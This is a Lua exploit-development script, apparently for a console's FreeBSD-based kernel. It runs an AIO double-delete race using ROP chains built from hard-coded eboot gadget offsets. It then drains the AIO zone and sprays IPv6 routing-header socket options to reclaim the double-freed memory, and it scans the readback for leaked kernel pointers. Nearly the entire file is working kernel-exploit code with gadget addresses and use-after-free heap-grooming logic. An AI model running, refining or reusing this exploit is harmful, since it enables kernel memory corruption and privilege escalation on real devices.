-- CRASH_CLASS: HIGH
-- PROBE 77c: prolapse with AIO zone drain + high-volume RTHDR spray
--
-- Problem: 77b showed double-free hits but no RTHDR overlap because
-- UMA zones are per-type. RTHDR goes to a different zone than m_aio_reqs2.
-- Solution: drain the AIO zone by submitting+deleting hundreds of requests,
-- forcing the zone to release pages back to the page allocator. Then spray
-- RTHDR to grab those released pages. The double-freed chunk should now
-- be on a page that RTHDR can reclaim.
--
-- Also: spray at MULTIPLE sizes since we don't know the exact AIO object
-- size on 14.10 (gist says 0x58→0x80 bucket, our 69l measured ~113B→128B)

print("=== PROBE 77c: PROLAPSE DRAIN + HIGH-VOLUME SPRAY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)
pcall(function() mk(670)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

-- RTHDR helpers
local spray_buf = memory.alloc(256)
local read_buf = memory.alloc(256)
local read_len = memory.alloc(8)

local function build_rthdr(size, tag)
    for i = 0, size - 1 do wb(N(spray_buf) + i, 0) end
    wb(N(spray_buf), 0)
    wb(N(spray_buf) + 1, (size / 8) - 1)
    wb(N(spray_buf) + 2, 0)
    wb(N(spray_buf) + 3, (size - 8) / 16)
    wd(N(spray_buf) + 8, tag)
end

local function call_sc(sc, ...)
    local ok, v = pcall(sc, ...)
    if not ok then return -999 end
    return N(v)
end

local sc_socket = mk(97)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_close = mk(6)

-- Race buffers
local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

-- ============================================================
-- PHASE 1: DRAIN — submit+delete many AIO requests to exhaust
-- the AIO zone's cached slabs. This forces the zone to return
-- pages to the page allocator.
-- ============================================================
print("")
print("[1] AIO ZONE DRAIN")
local DRAIN_COUNT = 128  -- submit this many, then delete all
local drain_ids = {}
local drain_ok = 0

for i = 1, DRAIN_COUNT do
    local id = submit_one()
    if id ~= 0 then
        drain_ids[#drain_ids + 1] = id
        drain_ok = drain_ok + 1
    end
end
print(string.format("  submitted %d AIO requests", drain_ok))

-- Poll all to complete them
for _, id in ipairs(drain_ids) do poll_one(id) end

-- Delete all to free the zone objects
for _, id in ipairs(drain_ids) do delete_one(id) end
print(string.format("  deleted %d → zone objects freed, pages may be released", #drain_ids))

if not alive() then print("DEAD after drain"); return end

-- ============================================================
-- PHASE 2: RACE — submit small batch + double-delete
-- ============================================================
print("")
print("[2] DOUBLE-DELETE RACE (5 rounds)")

local ITERS = 5
local total_doubles = 0
local total_overlaps = 0
local total_kptrs = 0

for iter = 1, ITERS do
    if not alive() then print(string.format("  iter %d: DEAD", iter)); break end

    -- Submit batch
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < 4 then print("  too few IDs"); break end
    local count = #ids

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Child A
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A); local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0)); emA(g_pop_rax); emA(uint64(431)); emA(stub)

    -- Child B
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B); local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0)); emB(g_pop_rax); emB(uint64(431)); emB(stub)

    -- thr_params
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A)); wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0)); wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B)); wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0)); wq(N(par_B) + 0x30, tB)

    -- Spawn both
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait
    for w = 1, 50000 do local _ = rd(sb_A) end

    -- Check double-delete
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: *** %d DOUBLE DELETES ***", iter, doubles))

        -- PHASE 3: HIGH-VOLUME SPRAY immediately after double-free
        -- Try multiple sizes to cover different possible AIO object zones
        local SIZES = {56, 72, 88, 104, 120}  -- 64B and 128B zones
        local SPRAY_N = 80  -- per size

        for _, sz in ipairs(SIZES) do
            local fds = {}
            local set_ok = 0
            for s = 1, SPRAY_N do
                local fd = call_sc(sc_socket, uint64(28), uint64(2), uint64(0))
                fds[s] = fd
                if fd >= 0 then
                    build_rthdr(sz, 0xCC000000 + iter * 0x10000 + sz * 0x100 + s)
                    local rv = call_sc(sc_setsockopt, uint64(fd), uint64(41), uint64(51),
                        spray_buf, uint64(sz))
                    if rv == 0 then set_ok = set_ok + 1 end
                end
            end

            -- Readback
            local overlaps = 0
            for s = 1, SPRAY_N do
                if fds[s] and fds[s] >= 0 then
                    wd(N(read_len), 256)
                    local rv = call_sc(sc_getsockopt, uint64(fds[s]), uint64(41),
                        uint64(51), read_buf, read_len)
                    if rv == 0 then
                        local tag = rd(N(read_buf) + 8) or 0
                        local expected = 0xCC000000 + iter * 0x10000 + sz * 0x100 + s
                        if tag ~= expected and tag ~= 0 then
                            -- Check if it's another spray socket's tag
                            if (tag >= 0xCC000000) then
                                overlaps = overlaps + 1
                                print(string.format("    OVERLAP sz=%d fd[%d]: got 0x%08X expected 0x%08X",
                                    sz, s, tag, expected))
                            end
                            -- Check for kernel pointers
                            for off = 0, sz - 8, 8 do
                                local v = rq(N(read_buf) + off)
                                if v then
                                    local h, l = get_hi_lo(v)
                                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                                        total_kptrs = total_kptrs + 1
                                        print(string.format("    *** KPTR sz=%d fd[%d]+0x%X: %s ***",
                                            sz, s, off, fmt(v)))
                                    end
                                end
                            end
                        end
                    end
                end
            end

            total_overlaps = total_overlaps + overlaps

            -- Cleanup
            for s = 1, SPRAY_N do
                if fds[s] and fds[s] >= 0 then call_sc(sc_close, uint64(fds[s])) end
            end
        end
    else
        if iter <= 2 then print(string.format("  iter %d: no double", iter)) end
    end
end

-- SUMMARY
print("")
print("[SUMMARY]")
print(string.format("  double frees:  %d", total_doubles))
print(string.format("  OVERLAPS:      %d", total_overlaps))
print(string.format("  kernel ptrs:   %d", total_kptrs))
print(string.format("  process:       %s", alive() and "ALIVE" or "DEAD"))

if total_overlaps > 0 then
    print("*** CROSS-ZONE RECLAIM CONFIRMED ***")
end
if total_kptrs > 0 then
    print("*** KERNEL POINTER LEAKED ***")
end
if total_doubles > 0 and total_overlaps == 0 then
    print("Double-free hit but no overlap. AIO zone may not release pages")
    print("to page allocator at this drain volume. Try: larger drain,")
    print("or use IP_OPTIONS (4-byte setsockopt) for small-zone spray,")
    print("or accept that same-zone spray needs the AIO submit path itself.")
end

print("")
print("=== 77c COMPLETE ===")
